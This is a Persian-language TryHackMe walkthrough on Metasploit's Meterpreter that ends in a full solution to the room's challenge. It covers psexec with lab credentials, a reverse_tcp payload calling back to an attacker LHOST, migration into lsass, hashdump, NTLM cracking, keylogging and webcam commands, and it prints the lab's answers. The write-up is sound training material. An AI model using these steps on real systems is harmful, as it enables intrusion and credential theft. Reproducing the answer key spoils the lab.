

<div dir="rtl" >
   
   # آموزش فارسی اتاق Metasploit: Meterpreter

این اتاق درباره‌ی **Meterpreter** است؛ یکی از مهم‌ترین Payloadهای Metasploit که معمولاً پس از نفوذ موفق، برای انجام فعالیت‌های Post-Exploitation استفاده می‌شود.

ساختار اتاق شامل پنج بخش است:

1. آشنایی با Meterpreter
2. انواع Meterpreter Payload
3. دستورات Meterpreter
4. عملیات Post-Exploitation
5. چالش عملی Post-Exploitation

---

## Task 1 — آشنایی با Meterpreter

### Meterpreter چیست؟

Meterpreter یک Payload پیشرفته در Metasploit است که پس از اجرای موفق Exploit روی سیستم هدف، یک Session تعاملی در اختیار تست‌کننده قرار می‌دهد.

به زبان ساده:

```text
Exploit
   ↓
اجرای Payload
   ↓
ایجاد Meterpreter Session
   ↓
انجام عملیات روی سیستم هدف
```

Meterpreter شبیه یک Shell معمولی است، اما امکانات بسیار بیشتری دارد. با استفاده از آن می‌توان:

* مشخصات سیستم را مشاهده کرد
* فایل‌ها و پوشه‌ها را بررسی کرد
* فایل دانلود یا آپلود کرد
* پردازش‌های در حال اجرا را دید
* اطلاعات شبکه را جمع‌آوری کرد
* سطح دسترسی Session را بررسی کرد
* دستورات Post-Exploitation را اجرا کرد
* از ماژول‌های دیگر Metasploit روی Session استفاده کرد

Meterpreter روی سیستم هدف مانند یک Agent در معماری Command and Control عمل می‌کند؛ یعنی سیستم مهاجم فرمان‌ها را می‌فرستد و Meterpreter آن‌ها را روی هدف اجرا می‌کند.

---

### Meterpreter چگونه اجرا می‌شود؟

یکی از ویژگی‌های مهم Meterpreter این است که معمولاً مستقیماً در حافظه یا RAM اجرا می‌شود و لازم نیست فایل مستقلی مانند `meterpreter.exe` روی دیسک هدف ذخیره شود.

این مدل اجرا چند مزیت دارد:

* فایل مشخصی روی دیسک باقی نمی‌ماند
* اسکن ساده‌ی فایل‌ها ممکن است چیزی پیدا نکند
* Meterpreter می‌تواند درون یک Process موجود اجرا شود
* ارتباط آن با Metasploit رمزنگاری‌شده است

البته این موضوع به معنی نامرئی بودن Meterpreter نیست. آنتی‌ویروس‌ها و محصولات EDR مدرن معمولاً قادر به شناسایی رفتارها یا Payloadهای شناخته‌شده Meterpreter هستند. خود TryHackMe نیز تأکید می‌کند که بیشتر آنتی‌ویروس‌های اصلی آن را تشخیص می‌دهند.

---

### ارتباط رمزنگاری‌شده

Meterpreter معمولاً از یک کانال رمزنگاری‌شده مبتنی بر TLS برای ارتباط با سیستم مهاجم استفاده می‌کند.

این رمزنگاری باعث می‌شود ابزارهای IDS و IPS شبکه نتوانند محتوای فرمان‌ها را مستقیماً مشاهده کنند، مگر اینکه سازمان قابلیت بازرسی ترافیک رمزنگاری‌شده را داشته باشد.

---

### Meterpreter داخل چه Processی اجرا می‌شود؟

برای دیدن شناسه‌ی Process فعلی Meterpreter از دستور زیر استفاده می‌کنیم:

```bash
getpid
```

خروجی نمونه:

```text
Current pid: 1304
```

سپس می‌توان فهرست Processهای سیستم هدف را دید:

```bash
ps
```

ممکن است متوجه شوید PID مربوط به Meterpreter متعلق به Processی مانند موارد زیر است:

```text
spoolsv.exe
powershell.exe
svchost.exe
```

این یعنی Meterpreter لزوماً به شکل Processی با نام `meterpreter.exe` دیده نمی‌شود و ممکن است داخل یک Process دیگر اجرا شود. در مثال رسمی اتاق، Meterpreter در Process مربوط به `spoolsv.exe` مشاهده می‌شود.

---

## Task 2 — انواع Meterpreter Payload

Meterpreter فقط یک Payload ثابت نیست. نسخه‌های مختلفی از آن برای سیستم‌عامل‌ها، معماری‌ها و زبان‌های مختلف وجود دارد.

برای مشاهده‌ی Payloadهای Meterpreter در Metasploit می‌توان از این دستور استفاده کرد:

```bash
msfvenom --list payloads | grep meterpreter
```

یا در `msfconsole`:

```bash
show payloads
```

---

### تفاوت Payloadها

نام یک Payload معمولاً اطلاعات مهمی درباره‌ی آن می‌دهد.

مثال:

```text
windows/x64/meterpreter/reverse_tcp
```

معنی قسمت‌های آن:

```text
windows       سیستم‌عامل هدف
x64           معماری ۶۴ بیتی
meterpreter   نوع Payload
reverse_tcp   روش برقراری ارتباط
```

نمونه‌های دیگر:

```text
windows/meterpreter/reverse_tcp
windows/x64/meterpreter/reverse_tcp
linux/x86/meterpreter/reverse_tcp
linux/x64/meterpreter/reverse_tcp
php/meterpreter/reverse_tcp
python/meterpreter/reverse_tcp
android/meterpreter/reverse_tcp
```

---

### انتخاب Payload مناسب

انتخاب Payload به چند عامل بستگی دارد:

* سیستم‌عامل هدف
* معماری پردازنده
* آسیب‌پذیری یا Exploit مورد استفاده
* محدودیت‌های شبکه
* امکانات موردنیاز در مرحله Post-Exploitation
* وجود یا نبودن ابزارهای امنیتی روی سیستم هدف

برای مثال، برای یک ویندوز ۶۴ بیتی ممکن است از این Payload استفاده شود:

```text
windows/x64/meterpreter/reverse_tcp
```

اما اگر Exploit فقط با معماری ۳۲ بیتی سازگار باشد، باید از نمونه‌ای مانند زیر استفاده شود:

```text
windows/meterpreter/reverse_tcp
```

---

### Reverse Connection چیست؟

در یک Reverse Payload، سیستم هدف به سیستم مهاجم متصل می‌شود.

```text
Target ───────────────► Attacker
       Reverse connection
```

برای این کار معمولاً باید این دو گزینه را تنظیم کرد:

```bash
set LHOST <ATTACKER_IP>
set LPORT 4444
```

* `LHOST`: آدرس IP سیستم مهاجم
* `LPORT`: پورتی که Handler روی آن گوش می‌دهد

در TryHackMe، اگر با VPN متصل شده باشید، `LHOST` معمولاً IP رابط `tun0` است:

```bash
ip addr show tun0
```

---

### Staged و Stageless

Meterpreter Payloadها می‌توانند Staged یا Stageless باشند.

#### Staged Payload

```text
windows/x64/meterpreter/reverse_tcp
```

ابتدا یک بخش کوچک به نام Stager اجرا می‌شود و سپس بخش اصلی Meterpreter از سیستم مهاجم دریافت می‌شود.

```text
Small Stager
     ↓
Connection to Handler
     ↓
Download Meterpreter Stage
```

مزیت:

* بخش اولیه کوچک‌تر است

محدودیت:

* Handler باید بتواند Stage دوم را به هدف تحویل دهد
* اگر ارتباط قطع شود، Payload کامل اجرا نمی‌شود

#### Stageless Payload

```text
windows/x64/meterpreter_reverse_tcp
```

تمام Meterpreter در همان Payload اولیه قرار دارد.

مزیت:

* Payload مستقل‌تر است
* نیازی به دریافت Stage دوم ندارد

محدودیت:

* فایل یا Payload بزرگ‌تر است

تفاوت ظاهری مهم:

```text
meterpreter/reverse_tcp    Staged
meterpreter_reverse_tcp    Stageless
```

---

## Task 3 — دستورات Meterpreter

پس از باز شدن Session، Prompt معمولاً به شکل زیر است:

```text
meterpreter >
```

برای مشاهده‌ی همه دستورات موجود:

```bash
help
```

یا:

```bash
?
```

دستورات قابل استفاده به نوع Meterpreter، سیستم‌عامل و Extensionهای بارگذاری‌شده بستگی دارند.

---

### 1. دستورات اصلی Session

#### مشاهده راهنما

```bash
help
```

#### خارج شدن از Session

```bash
exit
```

این دستور Session فعلی را خاتمه می‌دهد.

#### انتقال Session به پس‌زمینه

```bash
background
```

Session بسته نمی‌شود و به `msfconsole` برمی‌گردید.

برای بازگشت:

```bash
sessions
sessions -i <ID>
```

مثال:

```bash
sessions -i 1
```

#### نمایش شناسه Session

```bash
guid
```

#### بارگذاری Extension

```bash
load <extension>
```

برای مثال:

```bash
load kiwi
```

#### اجرای Post Module یا Script

```bash
run <module>
```

---

### 2. دستورات اطلاعات سیستم

#### مشاهده مشخصات سیستم

```bash
sysinfo
```

این دستور اطلاعاتی مانند موارد زیر را نشان می‌دهد:

* نام کامپیوتر
* سیستم‌عامل
* Domain
* معماری
* زبان سیستم
* نوع Meterpreter

#### مشاهده کاربر فعلی

```bash
getuid
```

خروجی احتمالی:

```text
Server username: NT AUTHORITY\SYSTEM
```

اگر Session با حساب `SYSTEM` اجرا شود، سطح دسترسی بسیار بالایی دارید.

#### مشاهده PID فعلی

```bash
getpid
```

#### مشاهده زمان بیکار بودن کاربر

```bash
idletime
```

این دستور نشان می‌دهد کاربر سیستم چه مدت فعالیتی نداشته است.

---

### 3. دستورات Processها

#### فهرست Processها

```bash
ps
```

اطلاعات معمول:

* PID
* PPID
* نام Process
* معماری
* Session
* کاربر
* مسیر فایل اجرایی

#### مهاجرت به Process دیگر

```bash
migrate <PID>
```

مثال:

```bash
migrate 780
```

مهاجرت می‌تواند دلایل مختلفی داشته باشد:

* افزایش پایداری Session
* دسترسی به قابلیت‌های خاص
* تغییر Process میزبان Meterpreter
* اجرای Credential Dumping
* هماهنگی معماری Meterpreter با Process

قبل از مهاجرت بررسی کنید که معماری Process با Meterpreter سازگار باشد.

#### متوقف کردن Process

```bash
kill <PID>
```

#### متوقف کردن بر اساس نام

```bash
pkill <PROCESS_NAME>
```

---

### 4. دستورات فایل و پوشه

#### نمایش پوشه فعلی

```bash
pwd
```

#### فهرست فایل‌ها

```bash
ls
```

یا:

```bash
dir
```

#### تغییر پوشه

```bash
cd <PATH>
```

مثال:

```bash
cd C:\\Users
```

#### نمایش محتوای فایل

```bash
cat <FILE>
```

اگر مسیر فاصله دارد، آن را داخل کوتیشن قرار دهید:

```bash
cat "C:\\Program Files\\data.txt"
```

#### جست‌وجوی فایل

```bash
search -f <FILENAME>
```

مثال:

```bash
search -f secrets.txt
```

می‌توان از Wildcard نیز استفاده کرد:

```bash
search -f *.txt
```

#### دانلود فایل از هدف

```bash
download <REMOTE_FILE>
```

مثال:

```bash
download "C:\\Users\\Public\\document.txt"
```

#### آپلود فایل روی هدف

```bash
upload <LOCAL_FILE>
```

مثال:

```bash
upload tool.exe
```

#### حذف فایل

```bash
rm <FILE>
```

#### ویرایش فایل

```bash
edit <FILE>
```

---

### 5. دستورات شبکه

#### مشاهده Interfaceهای شبکه

```bash
ifconfig
```

#### مشاهده ارتباط‌های شبکه

```bash
netstat
```

#### مشاهده ARP Cache

```bash
arp
```

ARP Cache می‌تواند برای شناسایی سیستم‌های دیگری که هدف با آن‌ها ارتباط داشته مفید باشد.

#### مشاهده Routing Table

```bash
route
```

#### Port Forwarding

```bash
portfwd
```

از Port Forwarding برای دسترسی به سرویس‌هایی استفاده می‌شود که از سیستم مهاجم مستقیماً قابل دسترسی نیستند.

---

### 6. ورود به Shell سیستم‌عامل

برای گرفتن Command Prompt معمولی سیستم هدف:

```bash
shell
```

در ویندوز، وارد `cmd.exe` می‌شوید:

```cmd
whoami
ipconfig
dir
net user
```

برای بازگشت از Shell به Meterpreter:

```cmd
exit
```

تفاوت مهم:

```text
meterpreter >    دستورات مخصوص Meterpreter

C:\>             دستورات عادی Windows CMD
```

---

### 7. اجرای دستور بدون باز کردن Shell

```bash
execute -f <PROGRAM>
```

مثال:

```bash
execute -f cmd.exe
```

یا اجرای یک دستور با آرگومان:

```bash
execute -f cmd.exe -a "/c whoami"
```

---

### 8. گرفتن Screenshot

```bash
screenshot
```

این دستور از Desktop فعال سیستم هدف تصویر می‌گیرد و فایل را روی سیستم مهاجم ذخیره می‌کند.

---

### 9. دستورات Webcam و Microphone

بسته به نوع Session و دسترسی موجود، دستوراتی مانند موارد زیر ممکن است در دسترس باشند:

```bash
webcam_list
webcam_snap
webcam_stream
record_mic
```

این قابلیت‌ها فقط باید در محیط آزمایشگاهی یا با مجوز صریح استفاده شوند.

---

### 10. Keylogging

دستورات اصلی:

```bash
keyscan_start
keyscan_dump
keyscan_stop
```

روند کار:

```bash
keyscan_start
```

پس از مدتی:

```bash
keyscan_dump
```

و سپس:

```bash
keyscan_stop
```

برای عملکرد بهتر Keylogger، Meterpreter معمولاً باید در Process مربوط به Session کاربر فعال اجرا شود.

---

### 11. افزایش سطح دسترسی

```bash
getsystem
```

Meterpreter تلاش می‌کند دسترسی Session را به `NT AUTHORITY\SYSTEM` ارتقا دهد.

سپس بررسی کنید:

```bash
getuid
```

موفقیت این دستور به نسخه سیستم‌عامل، Patchها، تنظیمات و سطح دسترسی اولیه بستگی دارد.

---

### 12. استخراج Hashها

```bash
hashdump
```

این دستور تلاش می‌کند Hashهای حساب‌های محلی Windows را از SAM استخراج کند.

فرمت خروجی معمولاً چنین است:

```text
username:RID:LM_HASH:NTLM_HASH:::
```

مثال:

```text
user:1001:aad3b435b51404eeaad3b435b51404ee:NTLM_HASH:::
```

در بیشتر سؤال‌ها، مقدار موردنظر همان فیلد چهارم یعنی NTLM Hash است.

برای اجرای `hashdump` معمولاً به سطح دسترسی بالا، اغلب `SYSTEM`، نیاز دارید.

---

## Task 4 — Post-Exploitation با Meterpreter

Post-Exploitation یعنی فعالیت‌هایی که پس از گرفتن دسترسی اولیه انجام می‌شوند.

هدف این مرحله صرفاً «هک کردن بیشتر» نیست؛ بلکه باید مشخص شود دسترسی به‌دست‌آمده چه تأثیری دارد.

برای مثال:

* به کدام سیستم دسترسی گرفته‌ایم؟
* Session با چه کاربری اجرا می‌شود؟
* سطح دسترسی آن چقدر است؟
* چه فایل‌هایی قابل مشاهده‌اند؟
* چه Credentialهایی در دسترس‌اند؟
* سیستم عضو چه Domain یا شبکه‌ای است؟
* چه Shareهایی وجود دارند؟
* آیا امکان حرکت به سیستم‌های دیگر وجود دارد؟

TryHackMe این اتاق را به‌عنوان بررسی عمیق Meterpreter و استفاده از Payloadهای In-Memory در Post-Exploitation معرفی می‌کند.

---

### اطلاعات اولیه‌ای که باید جمع‌آوری شوند

پس از دریافت Session ابتدا این دستورات را اجرا کنید:

```bash
sysinfo
getuid
getpid
pwd
ifconfig
netstat
ps
```

این دستورات یک تصویر اولیه از سیستم هدف می‌دهند.

---

### استفاده از Post Modules

همه عملیات لازم مستقیماً در Prompt Meterpreter انجام نمی‌شوند. گاهی باید Session را Background کرده و یک Post Module روی آن اجرا کنید.

روند کلی:

```bash
background
sessions
search <MODULE>
use <MODULE>
show options
set SESSION <ID>
run
```

مثال:

```bash
background
search enum_shares
use post/windows/gather/enum_shares
set SESSION 1
run
```

---

### تفاوت دستور Meterpreter و Post Module

بعضی عملیات مستقیماً داخل Meterpreter اجرا می‌شوند:

```bash
sysinfo
hashdump
search
cat
ps
```

بعضی دیگر به‌صورت Module در `msfconsole` اجرا می‌شوند:

```text
post/windows/gather/enum_shares
post/windows/gather/hashdump
post/windows/gather/enum_logged_on_users
```

در Post Module باید Session هدف را مشخص کنید:

```bash
set SESSION 1
```

---

### مهاجرت Process

در بعضی شرایط، قبل از استخراج Credential یا Hash لازم است Meterpreter را به Process مناسب‌تری منتقل کنید.

برای مشاهده Processها:

```bash
ps
```

در ویندوز، Process مهم `lsass.exe` مسئول بخش‌هایی از احراز هویت و مدیریت Credentialها است.

پس از پیدا کردن PID:

```bash
migrate <LSASS_PID>
```

سپس:

```bash
getpid
getuid
hashdump
```

مهاجرت همیشه ضروری نیست، اما در برخی Sessionها باعث می‌شود عملیات Credential Dumping درست اجرا شود. در walkthroughهای این چالش نیز مهاجرت به Process مربوط به LSASS پیش از `hashdump` پیشنهاد شده است.

---

## Task 5 — چالش نهایی Post-Exploitation

در این بخش باید با Credential داده‌شده، از ماژول SMB/PsExec استفاده کنید و یک Meterpreter Session روی سیستم ویندوزی هدف بگیرید.

Credentialهای آزمایشگاه:

```text
Username: ballen
Password: Password1
```

ماژول پیشنهادی:

```text
exploit/windows/smb/psexec
```

در Challenge باید اطلاعات سیستم، Shareها، Hash یک کاربر و چند فایل حساس را پیدا کنید. مسیر عمومی حل چالش در منابع آموزشی منتشرشده نیز بر پایه `psexec`، ماژول `enum_shares`، مهاجرت Process، `hashdump` و جست‌وجوی فایل‌ها است.

---

# راهنمای عملی حل Task نهایی

## مرحله 1 — روشن کردن Machine

Machine مربوط به اتاق را Start کنید و IP آن را یادداشت کنید:

```text
<TARGET_IP>
```

اگر از Kali شخصی استفاده می‌کنید، باید به VPN مربوط به TryHackMe متصل باشید.

بررسی اتصال:

```bash
ping -c 3 <TARGET_IP>
```

---

## مرحله 2 — اسکن اولیه

```bash
nmap -sC -sV -p- -T4 <TARGET_IP>
```

برای یک اسکن سریع‌تر:

```bash
nmap -sV -p 135,139,445 <TARGET_IP>
```

در این سناریو، باز بودن پورت‌های SMB مانند `139` و `445` اهمیت دارد. Walkthroughهای Challenge نیز این پورت‌ها را به‌عنوان نشانه‌ای برای ادامه کار با SMB و PsExec معرفی کرده‌اند.

---

## مرحله 3 — اجرای Metasploit

```bash
msfconsole
```

ماژول PsExec را انتخاب کنید:

```bash
use exploit/windows/smb/psexec
```

گزینه‌ها را ببینید:

```bash
show options
```

---

## مرحله 4 — تنظیم ماژول

```bash
set RHOSTS <TARGET_IP>
set SMBUser ballen
set SMBPass Password1
```

آدرس IP سیستم مهاجم را پیدا کنید:

```bash
ip addr show tun0
```

سپس:

```bash
set LHOST <YOUR_TUN0_IP>
```

Payload را نیز می‌توانید صریحاً انتخاب کنید:

```bash
set PAYLOAD windows/x64/meterpreter/reverse_tcp
```

تنظیمات را کنترل کنید:

```bash
show options
```

و ماژول را اجرا کنید:

```bash
run
```

اگر موفق باشد:

```text
Meterpreter session opened
```

---

## مرحله 5 — پاسخ سؤال نام کامپیوتر و Domain

در Meterpreter:

```bash
sysinfo
```

در خروجی به این قسمت‌ها توجه کنید:

```text
Computer
Domain
OS
Architecture
```

در نسخه اصلی Challenge، منابع منتشرشده این مقادیر را گزارش کرده‌اند:

```text
Computer: ACME-TEST
Domain: FLASH
```

ممکن است محیط اتاق در آینده تغییر کند؛ بنابراین پاسخ را از خروجی Session خودتان بردارید.

---

## مرحله 6 — پیدا کردن Share ساخته‌شده توسط کاربر

Session را Background کنید:

```bash
background
```

Sessionها را بررسی کنید:

```bash
sessions
```

ماژول Share Enumeration را پیدا کنید:

```bash
search enum_shares
```

سپس:

```bash
use post/windows/gather/enum_shares
show options
set SESSION 1
run
```

به‌جای `1`، شماره Session خودتان را قرار دهید.

در خروجی، Shareهای پیش‌فرض مانند موارد زیر ممکن است دیده شوند:

```text
ADMIN$
C$
IPC$
```

اما سؤال اتاق Share ساخته‌شده توسط کاربر را می‌خواهد. در نسخه اصلی Challenge، نام گزارش‌شده برای آن:

```text
speedster
```

است.

---

## مرحله 7 — بازگشت به Meterpreter

```bash
sessions
sessions -i 1
```

---

## مرحله 8 — بررسی سطح دسترسی

```bash
getuid
```

اگر خروجی چیزی شبیه زیر باشد، دسترسی کافی دارید:

```text
NT AUTHORITY\SYSTEM
```

در غیر این صورت:

```bash
getsystem
getuid
```

---

## مرحله 9 — پیدا کردن Processهای Meterpreter و LSASS

PID فعلی Meterpreter:

```bash
getpid
```

فهرست Processها:

```bash
ps
```

در خروجی، `lsass.exe` را پیدا کنید و PID آن را یادداشت کنید.

مثال:

```text
780   ...   lsass.exe
```

سپس مهاجرت کنید:

```bash
migrate 780
```

بررسی:

```bash
getpid
```

توجه کنید PID در Machine شما احتمالاً متفاوت است.

---

## مرحله 10 — استخراج NTLM Hash کاربر jchambers

```bash
hashdump
```

به دنبال خطی باشید که با نام زیر شروع می‌شود:

```text
jchambers:
```

فرمت:

```text
jchambers:RID:LM_HASH:NTLM_HASH:::
```

مقدار چهارم همان NTLM Hash موردنیاز است.

در نسخه‌ای که walkthroughها ثبت کرده‌اند، Hash گزارش‌شده:

```text
69596c7aa1e8daee17f8e78870e25a5c
```

است.

---

## مرحله 11 — Crack کردن Hash

ابتدا Hash را در فایل ذخیره کنید:

```bash
echo '69596c7aa1e8daee17f8e78870e25a5c' > hash.txt
```

با Hashcat:

```bash
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt
```

نمایش نتیجه:

```bash
hashcat -m 1000 hash.txt --show
```

`-m 1000` مربوط به NTLM است.

راه دیگر، استفاده از John the Ripper است:

```bash
john --format=NT hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

نمایش نتیجه:

```bash
john --show --format=NT hash.txt
```

در نسخه اصلی Challenge، پسورد گزارش‌شده برای `jchambers`:

```text
Trustno1
```

است.

---

## مرحله 12 — پیدا کردن secrets.txt

در Meterpreter:

```bash
search -f secrets.txt
```

اگر نتیجه زیاد بود، مسیر کامل را دقیق بررسی کنید.

در نسخه اصلی Challenge، مسیر گزارش‌شده:

```text
C:\Program Files (x86)\Windows Multimedia Platform\secrets.txt
```

است.

نمایش محتوای فایل:

```bash
cat "C:\\Program Files (x86)\\Windows Multimedia Platform\\secrets.txt"
```

در نسخه اصلی، محتوای گزارش‌شده:

```text
KDSvbsw3849!
```

است.

---

## مرحله 13 — پیدا کردن realsecret.txt

```bash
search -f realsecret.txt
```

مسیر گزارش‌شده در نسخه اصلی Challenge:

```text
C:\inetpub\wwwroot\realsecret.txt
```

است.

محتوا را بخوانید:

```bash
cat "C:\\inetpub\\wwwroot\\realsecret.txt"
```

مقدار گزارش‌شده:

```text
The Flash is the fastest man alive
```

است.

---

# مسیر خلاصه حل Challenge

```text
Start Machine
      ↓
Scan SMB ports
      ↓
Use exploit/windows/smb/psexec
      ↓
Set RHOSTS, SMBUser, SMBPass, LHOST
      ↓
Run and obtain Meterpreter
      ↓
sysinfo
      ↓
Background session
      ↓
Run post/windows/gather/enum_shares
      ↓
Return to Meterpreter
      ↓
getuid, getpid, ps
      ↓
Migrate to lsass.exe when necessary
      ↓
hashdump
      ↓
Crack jchambers NTLM hash
      ↓
search -f secrets.txt
      ↓
cat the file
      ↓
search -f realsecret.txt
      ↓
cat the file
```

---

# دستورات مهم برای مرور سریع

```bash
# Session information
sysinfo
getuid
getpid
idletime

# Processes
ps
migrate <PID>
kill <PID>

# Files
pwd
ls
cd <PATH>
search -f <FILE>
cat <FILE>
download <FILE>
upload <FILE>

# Network
ifconfig
netstat
arp
route

# System shell
shell

# Privileges and credentials
getsystem
hashdump

# Session management
background
sessions
sessions -i <ID>

# Post module
use post/windows/gather/enum_shares
set SESSION <ID>
run

# Challenge exploitation
use exploit/windows/smb/psexec
set RHOSTS <TARGET_IP>
set SMBUser ballen
set SMBPass Password1
set LHOST <ATTACKER_IP>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
run
```

---

# نکات رفع اشکال

## Session باز نمی‌شود

بررسی کنید:

```bash
show options
```

* `RHOSTS` درست باشد
* `LHOST` برابر IP رابط `tun0` باشد
* Machine اتاق روشن باشد
* VPN متصل باشد
* Payload با معماری هدف سازگار باشد

---

## خطای authentication دریافت می‌کنید

Credentialها را دقیق وارد کنید:

```bash
set SMBUser ballen
set SMBPass Password1
```

حروف بزرگ و کوچک در Password مهم‌اند.

---

## دستور hashdump خطا می‌دهد

ابتدا بررسی کنید:

```bash
getuid
```

سپس:

```bash
getsystem
```

اگر همچنان خطا داشت:

```bash
ps
migrate <LSASS_PID>
hashdump
```

---

## search فایل را پیدا نمی‌کند

نام را دقیق وارد کنید:

```bash
search -f secrets.txt
search -f realsecret.txt
```

یا از Wildcard استفاده کنید:

```bash
search -f *secret*.txt
```

---

## cat مسیر دارای فاصله را باز نمی‌کند

مسیر را داخل کوتیشن بگذارید و در صورت نیاز Backslashها را دو بار بنویسید:

```bash
cat "C:\\Program Files (x86)\\Windows Multimedia Platform\\secrets.txt"
```

---

## Session بعد از background گم شده است

```bash
sessions
```

سپس:

```bash
sessions -i <ID>
```

---

# جمع‌بندی مفهومی

Meterpreter صرفاً یک Command Shell نیست. این Payload یک محیط کامل برای مدیریت Session و Post-Exploitation فراهم می‌کند.

نکات اصلی اتاق:

* Meterpreter معمولاً در حافظه اجرا می‌شود.
* نسخه‌های متفاوتی برای سیستم‌عامل‌ها و معماری‌های مختلف دارد.
* با `sysinfo` و `getuid` می‌توان وضعیت سیستم و دسترسی را فهمید.
* با `ps` و `migrate` می‌توان Process میزبان Session را مدیریت کرد.
* با `search`، `cat`، `upload` و `download` می‌توان با فایل‌ها کار کرد.
* با Post Moduleها می‌توان عملیات تکمیلی مانند شناسایی Shareها را انجام داد.
* با `hashdump` می‌توان Hash حساب‌های محلی را در یک محیط مجاز استخراج کرد.
* هدف Post-Exploitation، بررسی اثر واقعی دسترسی به‌دست‌آمده است.
* استفاده از این ابزارها فقط روی آزمایشگاه‌ها یا سیستم‌هایی که مجوز صریح دارید قانونی و اخلاقی است.

.
</div>
